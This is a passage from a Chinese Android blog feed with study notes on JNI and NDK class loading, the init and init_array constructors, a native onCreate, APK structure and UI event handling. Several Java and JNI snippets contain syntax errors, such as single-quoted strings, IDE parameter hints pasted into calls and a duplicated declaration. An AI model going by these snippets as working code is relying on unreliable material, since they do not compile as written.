title="子线程中获取java类"></a>子线程中获取java类</h2><p>1）在子线程中，findClass可以直接获取系统类</p><p>2）在主线程中获取类，使用全局引用来传递到子线程中</p><p>3）在主线程中获取正确的ClassLoader，在子线程中去加载类</p><p>​    3.1在Java中，可以先获取类字节码，然后使用getClassLoader()获取</p><p>​        Demo. class. getClassLoader()</p><p>​        new Demo().getClass(). getClassLoader()</p><p>​        Class.forName(类路径).getClassLoader()</p><p>​    3.2 在jni的主线程中获取ClassLoader</p><p>​    3.3 在jni的子线程中获取loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jobject ClassLoaderObj;</span><br><span class="line"><span class="comment">//子线程中</span></span><br><span class="line">JNIEnv* env = nullptr;</span><br><span class="line"><span class="keyword">if</span>(globalVM-&gt;AttachCurrentThread(reinterpret_cast&lt;JNIEnv **&gt;(&amp;env), nullptr) != JNI_OK)&#123;</span><br><span class="line">LOGD(<span class="string">&quot;myThread GetEnv failed&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;myThread JNIEnv: %p&quot;</span>, env);</span><br><span class="line"></span><br><span class="line">    <span class="type">jclass</span> <span class="variable">ClassLoaderClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/ClassLoader&quot;</span>); <span class="comment">//子线程中可以findclass获得系统类</span></span><br><span class="line">    <span class="type">jmethodID</span> <span class="variable">loadClassID</span> <span class="operator">=</span> env-&gt;GetMethodID(ClassLoaderClazz, <span class="string">&quot;loadClass&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>);</span><br><span class="line">    <span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> static_cast&lt;jclass&gt;(env-&gt;CallObjectMethod(ClassLoaderObj, loadClassID, env-&gt;NewStringUTF(<span class="string">&quot;com.xiaojianbang.ndkdemo.MainActivity&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//jclass MainActivityClazz = env-&gt;FindClass(&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;);</span></span><br><span class="line"><span class="comment">//主线程中</span></span><br><span class="line"><span class="comment">// MainActivity.class.getClassLoader();</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;</span>);</span><br><span class="line"><span class="type">jclass</span> <span class="variable">classClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/Class&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">getClassLoaderID</span> <span class="operator">=</span> env-&gt;GetMethodID(classClazz, <span class="string">&quot;getClassLoader&quot;</span>, <span class="string">&quot;()Ljava/lang/ClassLoader;&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">tempClassLoaderObj</span> <span class="operator">=</span> env-&gt;CallObjectMethod(MainActivityClazz, getClassLoaderID);</span><br><span class="line">ClassLoaderObj = env-&gt;NewGlobalRef(tempClassLoaderObj);</span><br></pre></td></tr></table></figure><h2 id="init与initarray"><a href="#init与initarray" class="headerlink" title="init与initarray"></a>init与initarray</h2><p>在so执行JNI_OnLoad之前，还会执行两个构造函数init，initarray</p><p>so加固，so中的字符串加密等等，一般会把相关代码放到这里</p><p>init使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init()&#123;  <span class="comment">//函数名必须为_init 在ida中被编译为init_proc</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initarray使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">200</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">101</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br></pre></td></tr></table></figure><p>当函数全写成第一个格式，执行顺序从上到下。</p><p>当函数有数字时：数字越小越先执行。</p><p>有数字和没有数字：没有数字最后执行</p><p>即constructor 后面的值，较小的先执行，最好从100以后开始用，如果 constructor 后面没有跟值，那么按定义的顺序，从上往下执行。</p><h2 id="onCreate的native化"><a href="#onCreate的native化" class="headerlink" title="onCreate的native化"></a>onCreate的native化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="type">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_xiaojianbang_ndkdemo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz, jobject saved_instance_state)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement onCreate()</span></span><br><span class="line">    <span class="comment">// super.onCreate(savedInstanceState);</span></span><br><span class="line">    jclass AppCompatActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(thiz,AppCompatActivityClazz, onCreateID, saved_instance_state);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getLayoutInflater()</span></span><br><span class="line">    <span class="comment">//android.app.Activity getLayoutInflater</span></span><br><span class="line">    jclass ActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;android/app/Activity&quot;</span>);</span><br><span class="line">    jmethodID getLayoutInflaterID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityClazz, <span class="string">&quot;getLayoutInflater&quot;</span>, <span class="string">&quot;()Landroid/view/LayoutInflater;&quot;</span>);</span><br><span class="line">    jobject LayoutInflater = env-&gt;<span class="built_in">CallObjectMethod</span>(thiz, getLayoutInflaterID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding = ActivityMainBinding.inflate(getLayoutInflater());</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding inflate</span></span><br><span class="line">    <span class="comment">// public static ActivityMainBinding inflate(LayoutInflater inflater)</span></span><br><span class="line">    jclass ActivityMainBindingClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/xiaojianbang/ndkdemo/databinding/ActivityMainBinding&quot;</span>);</span><br><span class="line">    jmethodID inflateID = env-&gt;<span class="built_in">GetStaticMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;inflate&quot;</span>, <span class="string">&quot;(Landroid/view/LayoutInflater;)Lcom/xiaojianbang/ndkdemo/databinding/ActivityMainBinding;&quot;</span>);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;ActivityMainBindingClazz %p&quot;</span>, ActivityMainBindingClazz);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;inflateID %p&quot;</span>, inflateID);</span><br><span class="line">    jobject ActivityMainBindingObj = env-&gt;<span class="built_in">CallStaticObjectMethod</span>(ActivityMainBindingClazz, inflateID, LayoutInflater);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding.getRoot()</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding</span></span><br><span class="line">    <span class="comment">// public ConstraintLayout getRoot()</span></span><br><span class="line">    jmethodID getRootID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;getRoot&quot;</span>, <span class="string">&quot;()Landroidx/constraintlayout/widget/ConstraintLayout;&quot;</span>);</span><br><span class="line">    jobject ConstraintLayout = env-&gt;<span class="built_in">CallObjectMethod</span>(ActivityMainBindingObj, getRootID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setContentView(binding.getRoot());</span></span><br><span class="line">    jmethodID setContentViewID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;setContentView&quot;</span>, <span class="string">&quot;(Landroid/view/View;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallVoidMethod</span>(thiz, setContentViewID, ConstraintLayout);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NDK开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> NDK开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android基础知识</title>
      <link href="/posts/7e4211d.html"/>
      <url>/posts/7e4211d.html</url>
      
        <content type="html"><![CDATA[<h1 id="Android基础性知识"><a href="#Android基础性知识" class="headerlink" title="Android基础性知识"></a>Android基础性知识</h1><h2 id="apk文件结构"><a href="#apk文件结构" class="headerlink" title="apk文件结构"></a>apk文件结构</h2><p>apk文件后缀为.apk。就是安卓上的安装包，而apk文件其实就是一个压缩包，可以对其进行解压缩。apk文件里面一般包括以下部分：静态资源文件(assets)，库文件(lib)，签名文件(META-INF)，编译资源文件(res)，配置清单文件(AndroidManifest.xml)，核心代码文件(classes.dex)和资源映射文件(resources.arsc)等。<img src="2025-01-15-Android基础知识/image-20231016174722001.png" alt="image-20231016174722001"></p><h3 id="assets文件夹"><a href="#assets文件夹" class="headerlink" title="assets文件夹"></a><img src="2025-01-15-Android基础知识/image-20231016175007953.png" alt="image-20231016175007953">assets文件夹</h3><p>assets 这里存放的是静态资源文件(图片，视频等)。这个文件夹下的资源文件不会被编译，而是直接打包进应用程序中。这些文件通常是一些静态资源，如图片、音频、文本文件等。assets中的资源访问速度较快，通常情况下，开发者会将应用程序中的静态文件、配置文件、原始数据或者其他不常改变的文件放在 assets 文件夹中。</p><h3 id="lib文件夹"><a href="#lib文件夹" class="headerlink" title="lib文件夹"></a>lib文件夹</h3><p>里面存放.so(动态链接库)文件，它包含在应用程序中，可以在运行时被调用。这些库通常包含许多常见的函数和程序，lib文件夹下有不同系统架构的so文件，可适用于不同环境中，rmeabi-v7a目录基本通用所有android设备，arm64-v8a目录只适用于64位的android设备，x86目录常见用于android模拟器，x86-64目录适用于支持x86_64架构的Android设备。</p><p>在安卓系统中库文件分为两种：一种是共享库文件，另一种是本地库文件。</p><p>共享库文件可供多个应用程序使用，提高运行效率。共享库文件以.so为后缀，常见的共享库文件是libc.so和libm.so</p><p>lib文件夹下的是本地库文件，为特定应用程序所使用的。</p><h3 id="META-INF文件夹"><a href="#META-INF文件夹" class="headerlink" title="META-INF文件夹"></a>META-INF文件夹</h3><p>META-INF文件夹是存放数字签名相关文件的文件夹，包含以下三个文件：</p><ol><li>MANIFEST.MF：是一个摘要清单文件，它包含了apk文件中除自己以外所有文件的数字摘要(名称和哈希值)，用于确保APK文件的完整性。</li><li>CERT.SF：用于存储通过私钥加密后得到的MANIFEST.MF文件的数字签名信息以及MANIFEST.MF文件中数字摘要的数字签名信息。即存放使用私钥加密后的数字摘要信息。</li><li>CERT.PSA：包含解密使用的public key和对文件签名时所使用的数字证书。</li></ol><p>之，META-INF文件夹中的文件是用于保护APK文件的完整性和真实性的重要文件，可以确保APK文件来自合法的开发者，并且没有被篡改过。</p><p>APK在安装APK时，会验证APK的数字签名是否合法，验证过程包括以下几个步骤：</p><ol><li>提取APK文件中的数字证书。</li><li>从数字证书中提取公钥。</li><li>使用该公钥对APK文件中的数字签名进行解密，得到数字摘要。</li><li>对APK文件进行Hash运算，生成数字摘要。</li><li>比较步骤3和步骤4中生成的数字摘要是否一致，如果一致则认为数字签名合法，否则认为数字签名不合法。</li></ol><h3 id="配置清单文件-AndroidManifest-xml"><a href="#配置清单文件-AndroidManifest-xml" class="headerlink" title="配置清单文件(AndroidManifest.xml)"></a>配置清单文件(AndroidManifest.xml)</h3><p>AndroidManifest.xml是Android应用程序中最重要的文件之一，它包含了应用程序的基本信息，如应用程序的名称、图标、版本号、权限、组件（Activity、Service、BroadcastReceiver、Content Provider）等等。</p><h4 id="1-manifest标签"><a href="#1-manifest标签" class="headerlink" title="1.manifest标签"></a>1.manifest标签</h4><p>manifest标签是AndroidManifest.xml文件的根标签，它包含了应用程序的基本信息，如包名、版本号、SDK版本、应用程序的名称和图标等等。</p><h4 id="2-application标签"><a href="#2-application标签" class="headerlink" title="2.application标签"></a>2.application标签</h4><p>application标签是应用程序的主要标签，它包含了应用程序的所有组件，如Activity(活动)、Service(服务)、Broadcast Receiver(广播接收器)、Content  Provider(内容提供者)等等。在application标签中，也可以设置应用程序的全局属性，如主题、权限等等。</p><h4 id="3-activity标签"><a href="#3-activity标签" class="headerlink" title="3.activity标签"></a>3.activity标签</h4><p>activity标签定义了一个Activity组件，它包含了Activity的基本信息，如Activity的名称、图标、主题、启动模式等等。在activity标签中，还可以定义Activity的布局、Intent过滤器等等。</p><h4 id="4-service标签"><a href="#4-service标签" class="headerlink" title="4.service标签"></a>4.service标签</h4><p>service标签定义了一个Service组件，它包含了Service的基本信息，如Service的名称、图标、启动模式等等。在service标签中，还可以定义Service的Intent过滤器等等。</p><h4 id="5-receiver标签"><a href="#5-receiver标签" class="headerlink" title="5.receiver标签"></a>5.receiver标签</h4><p>receiver标签定义了一个BroadcastReceiver组件，它包含了BroadcastReceiver的基本信息，如BroadcastReceiver的名称、图标、权限等等。在receiver标签中，还可以定义BroadcastReceiver的Intent过滤器等等。</p><h4 id="6-provider标签"><a href="#6-provider标签" class="headerlink" title="6.provider标签"></a>6.provider标签</h4><p>provider标签定义了一个Content Provider组件，它包含了Content Provider的基本信息，如Content  Provider的名称、图标、权限等等。在provider标签中，还可以定义Content Provider的URI和Mime Type等等。</p><h4 id="7-uses-permission标签"><a href="#7-uses-permission标签" class="headerlink" title="7.uses-permission标签"></a>7.uses-permission标签</h4><p>uses-permission标签定义了应用程序需要的权限，如访问网络、读取SD卡等等。在应用程序安装时，系统会提示用户授权这些权限。</p><p>添加sd卡相应权限外 还需要<code>android:requestLegacyExternalStorage=&quot;true&quot;</code></p><h4 id="8-uses-feature标签"><a href="#8-uses-feature标签" class="headerlink" title="8.uses-feature标签"></a>8.uses-feature标签</h4><p>uses-feature标签定义了应用程序需要的硬件或软件特性，如摄像头、GPS等等。在应用程序安装时，系统会检查设备是否支持这些特性。</p><h3 id="resources-arsc文件"><a href="#resources-arsc文件" class="headerlink" title="resources.arsc文件"></a>resources.arsc文件</h3><p>resources.arsc它是一个二进制文件，包含了应用程序的所有资源信息，例如布局文件、字符串、图片等。这个文件在应用程序编译过程中由aapt工具生成，并被打包进APK文件中。</p><p>resources.arsc文件的主要作用是提供资源的索引和映射关系。应用程序通常是通过资源 ID在这个资源映射表中寻找对应的资源。当应用程序运行时，系统会根据R类中的ID来查找对应的资源，并将其加载到内存中，供应用程序使用。这个过程是通过解析resources.arsc文件和R类实现的。通过这种方式，应用程序可以方便地访问和使用资源，而不需要手动处理资源文件的位置和命名等问题。</p><h3 id="res文件夹"><a href="#res文件夹" class="headerlink" title="res文件夹"></a>res文件夹</h3><p>res文件夹，存放的也是资源文件，与assets文件夹不同的是，这里是编译后的资源文件。res的每个子文件夹用来存放特定类型的资源文件。在Android应用程序开发中，资源文件通常是以XML格式存储的，如布局文件、字符串资源、颜色资源等。</p><h4 id="drawable-文件夹"><a href="#drawable-文件夹" class="headerlink" title="drawable 文件夹"></a>drawable 文件夹</h4><p>用来存放图片资源文件，包括位图文件（.png, .jpg, .gif 等）和矢量图文件（.svg）。</p><h4 id="layout文件夹"><a href="#layout文件夹" class="headerlink" title="layout文件夹"></a>layout文件夹</h4><p>用来存放布局文件，布局文件用来描述应用程序的界面结构。</p><h4 id="values-文件夹"><a href="#values-文件夹" class="headerlink" title="values 文件夹"></a>values 文件夹</h4><p>来存放值资源文件，值资源文件用来存放应用程序中使用的常量值和颜色信息。</p><p>当想要手机内容和系统语言一致使，创建一个valuse-zh/values-en</p><h4 id="classes-dex文件"><a href="#classes-dex文件" class="headerlink" title="classes.dex文件"></a>classes.dex文件</h4><p>它是应用程序的可执行文件。它是一个被编译过的DEX（Dalvik Executable）文件，是Dalvik虚拟机的格式，用于在Android设备上运行Java应用程序。</p><h2 id="常用的UI组件"><a href="#常用的UI组件" class="headerlink" title="常用的UI组件"></a>常用的UI组件</h2><p>TextView—文本显示组件</p><p>EditView—文本编辑组件，继承自TextView组件</p><p>Button—按钮</p><p>CheckBox &amp;&amp; RadioButton—复选框和单选框，继承自Button类。其中RadioButton是单选按钮必须编制到RadioGroup中，同一时刻只有一个可以被选中。</p><p>ListView—列表组件</p><p>Spinner—下拉列表组件 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_test);</span><br><span class="line">button.setText(<span class="string">&#x27;Button&#x27;</span>); <span class="comment">//设置button组件的内容为‘button’</span></span><br><span class="line"></span><br><span class="line"><span class="type">TextView</span> <span class="variable">textview</span> <span class="operator">=</span> findViewById(R.id.textView_test);</span><br><span class="line">textview.setText(<span class="string">&#x27;text&#x27;</span>); <span class="comment">//设置文本框内容为&#x27;text&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">EditText</span> <span class="variable">edittext</span> <span class="operator">=</span>  findViewById(R.id.editTextTextPassword);</span><br><span class="line">edittext.setHint(<span class="string">&#x27;请输入密码&#x27;</span>) <span class="comment">//设置用户编辑框中提示‘请输入密码’，当用户输入时就消失</span></span><br><span class="line"> </span><br><span class="line"><span class="type">RadioGroup</span> <span class="variable">radiogroup</span> <span class="operator">=</span> findViewById(R.id.radioGroup);</span><br><span class="line">radiogroup.check(R.id.radioButton); <span class="comment">//  RadioGroup中选择一个单选框</span></span><br><span class="line"></span><br><span class="line"><span class="type">AdapterView</span> <span class="variable">spinner</span> <span class="operator">=</span> find <span class="title function_">ViewById</span><span class="params">(R.id.spinner)</span>; <span class="comment">//列表类控件,使用AdapterView类，这样可以方便切换Spinner和ListView，只需要改R.layout_item标签头就可以</span></span><br><span class="line"><span class="comment">//数组数据适配器</span></span><br><span class="line"><span class="comment">//创建数据适配器对象</span></span><br><span class="line">String []data = &#123;<span class="string">&#x27;Item1&#x27;</span>,<span class="string">&#x27;Item2&#x27;</span>,<span class="string">&#x27;Item3&#x27;</span>&#125;; <span class="comment">//下拉列表的数据，为String型 所以下面是&lt;String&gt;</span></span><br><span class="line">ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(context <span class="built_in">this</span>, </span><br><span class="line">                                                        R.layout_item(布局文件，控制下拉列表每一行的样子),</span><br><span class="line">                                                        R.id.textview_msg(文本框id),</span><br><span class="line">                                                        data);</span><br><span class="line">spinner.setAdapter(adapter); <span class="comment">//下拉列表加载对象 </span></span><br><span class="line"><span class="comment">//使用简单适配器可以使每个下拉列表图片和数据不一样</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安卓事件处理模型"><a href="#安卓事件处理模型" class="headerlink" title="安卓事件处理模型"></a>安卓事件处理模型</h2><h3 id="基于多态机制的事件处理"><a href="#基于多态机制的事件处理" class="headerlink" title="基于多态机制的事件处理"></a>基于多态机制的事件处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当屏幕被触摸时该方法被调用 event为触摸事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span>;</span><br><span class="line"><span class="comment">//当键盘被按下时该方法被调用 keycode为按键码 event为按键事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyUp</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"><span class="comment">//当键盘被弹起时该方法被调用 keycode为按键码 event为按键事件</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode,KeyEvent event)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值为true时，表示已经完整的处理了事件，其他回调方法不会在处理该事件</span></span><br><span class="line"><span class="comment">//返回值为false时，表示被没有完全处理完事件，其他回调方法会继续对该事件进行处理</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.getPointerCount();  <span class="comment">//获取坐标数量 </span></span><br></pre></td></tr></table></figure><h3 id="基于监听接口的事件处理"><a href="#基于监听接口的事件处理" class="headerlink" title="基于监听接口的事件处理"></a>基于监听接口的事件处理</h3><p>处理多态的不可维护性</p><ul><li><p>事件接口</p></li><li><p>View.OnClickListener ===&gt; 单击事件接口 </p></li></ul><p>​        当用户触摸这个item（在触摸模式下），或者通过浏览键或跟踪球聚焦在这个item上，然后按下“确认”键或者按下跟踪球时被调用。</p><ul><li><p>View.OnCreateContextMenuListener ===&gt; 菜单事件接口                                                                                   当正在创建一个上下文菜单的时候被调用（作为持续的“长点击”动作的结果）。</p></li><li><p>View.OnFocusChangeListener ===&gt; 焦点改变事件<br>当用户使用浏览键或跟踪球浏览进入或离开这个item时被调用</p></li><li><p>View.OnKeyListener ===&gt; 按键事件接口<br>当用户聚焦在这个item上并按下或释放设备上的一个按键时被调用。</p></li><li><p>View.OnLongClickListener ===&gt; 长按事件接口<br>当用户触摸并控制住这个item（在触摸模式下），或者通过浏览键或跟踪球聚焦在这个item上，然后保持按下“确认”键或者按下跟踪球（一秒钟）时被调用。</p></li><li><p>View.OnTouchListener ===&gt; 触屏事件接口<br>当用户执行的动作被当做一个触摸事件时被调用，包括按下，释放，或者屏幕上任何的移动手势（在这个item的边界内）。</p></li><li><p>举个例子，写一个简单的单击事件监听器</p></li><li><p>重写监听器</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClickListen</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Log.d(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;button1 click&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注册监听器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">MyClickListen</span>());</span><br></pre></td></tr></table></figure><p>当点击绑定的按钮就会调用MyClickListen方法 </p><ul><li>匿名类实现监听器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TextView mTextView;</span><br><span class="line">mTextView = findViewById(R.id.textview);</span><br><span class="line">  </span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span>findViewById(R.id.button);  </span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">        Lod.g(tag:<span class="string">&quot;51asm&quot;</span>,msg:<span class="string">&quot;MainActivity$1 button click&quot;</span>);</span><br><span class="line">        mTextView.setText(<span class="string">&quot;&quot;</span>MainActivity$<span class="number">1</span> button<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">   </span></span><br></pre></td></tr></table></figure><h3 id="基于系统设置的事件处理"><a href="#基于系统设置的事件处理" class="headerlink" title="基于系统设置的事件处理"></a>基于系统设置的事件处理</h3><p> Configuration类</p><p> Configuration类专门用于扫描手机设备上的配置信息</p><p>获取系统设置信息</p><p>Resources类的getConfiguration方法，可以获取系统设置对象</p><p>Resources对象，可以通过Activity的getResources方法获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> getResources().getConfiguration();</span><br><span class="line">    <span class="keyword">if</span>(config.orientation == Configuration.ORIENTATION_LANDSCAPE)&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;横屏&quot;</span>，Toast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Toast.makeText(context:<span class="built_in">this</span>,text:<span class="string">&quot;纵屏&quot;</span>，Toast.LENGTH_LONG).show(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Android启动流程"><a href="#Android启动流程" class="headerlink" title="Android启动流程"></a>Android启动流程<img src="2025-01-15-Android基础知识/image-20231024163626871.png" alt="image-20231024163626871"></h2><h2 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><ul><li>Activity是一个UI容器，可以包含任意的用户接口元素，如按钮，文本框等。</li><li>Activity提供了和用户交互的可视化界面</li><li>Activity之间可以通过消息的方式互相跳转和传输数据</li><li>要使应用能够使用Activity，必须在配置清单中声明Activity及其特定属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//启动一个新界面</span></span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> 